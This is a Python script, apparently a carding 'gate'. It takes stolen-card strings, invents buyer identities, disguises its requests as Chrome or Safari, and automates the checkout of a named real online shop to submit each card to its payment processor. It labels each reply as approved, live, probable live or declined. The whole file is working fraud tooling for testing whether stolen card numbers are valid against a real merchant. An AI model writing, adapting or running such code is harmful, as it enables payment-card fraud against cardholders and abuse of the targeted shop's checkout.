import random
import re
from random import choice
from fake_useragent import UserAgent
from curl_cffi import requests
from faker import Faker

def usuario() -> dict:
    number = random.randint(1111, 9999)
    return {
        'name': Faker().name(),
        'email': Faker().email().replace('@', f'{number}@'),
        'phone': f'512678{number}',
        'city': Faker().city(),
        'state': 'Oregon',
        'zip': '97402',
        'street': f"{random.randint(100, 999)} B Airport Rd"
    }

def ccn_gate(card):
    try:
        cc_number, mes, ano_number, cvv = card.split('|')
        if len(ano_number) == 4:
            ano_number = ano_number[2:4]

        cliente = requests.Session(
            impersonate=choice(["chrome124", "safari17_0"])
        )
        agente_user = UserAgent().random
        user_data = usuario()

        headers = {"User-Agent": agente_user}
        result = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
        form_key = re.search(r'name="form_key" type="hidden" value="(\w+)"', result.text)
        if not form_key:
            return "Failed to get form_key"
        form_key = form_key.group(1)

        headers["Cookie"] = f"form_key={form_key};"
        data = {"product": "21873", "item": "21873", "form_key": form_key,
                "super_attribute[183]": "6440", "qty": "1"}
        cliente.post(url="https://glorybee.com/checkout/cart/add/uenc/aHR0cHM6Ly9nbG9yeWJlZS5jb20vcXVlZW4tZXhjbHVkZXJz/product/21873/",
                     data=data, headers=headers)

        result = cliente.get(url="https://glorybee.com/checkout/cart/", headers=headers)
        form_id = re.search(r'"entity_id":"(\d+)"', result.text)
        if not form_id:
            return "Failed to get form_id"
        form_id = form_id.group(1)

        address_info = {
            "shipping_address": {
                "countryId": "US", "regionId": "49", "regionCode": "OR", "region": "Oregon",
                "street": [user_data['street']], "telephone": user_data['phone'],
                "postcode": user_data['zip'], "city": user_data['city'],
                "firstname": user_data['name'].split(' ')[0],
                "lastname": user_data['name'].split(' ')[1]
            },
            "billing_address": {
                "countryId": "US", "regionId": "49", "regionCode": "OR", "region": "Oregon",
                "street": [user_data['street']], "telephone": user_data['phone'],
                "postcode": user_data['zip'], "city": user_data['city'],
                "firstname": user_data['name'].split(' ')[0],
                "lastname": user_data['name'].split(' ')[1]
            },
            "shipping_method_code": "GND",
            "shipping_carrier_code": "shqups"
        }
        cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information",
                     json={"addressInformation": address_info}, headers=headers)

        data_payment = "payment_method=paya"
        cliente.post(url="https://glorybee.com/magecomp_surcharge/checkout/applyPaymentMethod/",
                     data=data_payment, headers=headers)

        paya_data = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={user_data['name']}"
        result = cliente.post(url="https://glorybee.com/paya/checkout/request", data=paya_data, headers=headers)
        
        try:
            response_json = result.json()
            message_text = response_json.get('paymentresponse', {}).get('message', 'No message')
        except:
            return "No JSON response"

        # Capturamos todos los mensajes que indican "Live" o "Probable Live"
        if "Successful" in message_text or "Transaction was approved" in message_text:
            return "Approved! ✅"
        elif "There was a problem with the request." in message_text:
            return "Probable Live ⚠️"
        elif "AVS" in message_text or "Street Address and 5 Digit Postal Code Match" in message_text:
            return "Live! AVS Match ✅"
        elif "CVV2" in message_text or "Invalid CVV" in message_text:
            return "CVV2 Mismatch ❌"
        else:
            return f"Declined: {message_text} ❌"

    except Exception as e:
        print(f"Error en el gate: {e}")
        return "Gate Failed ❌"

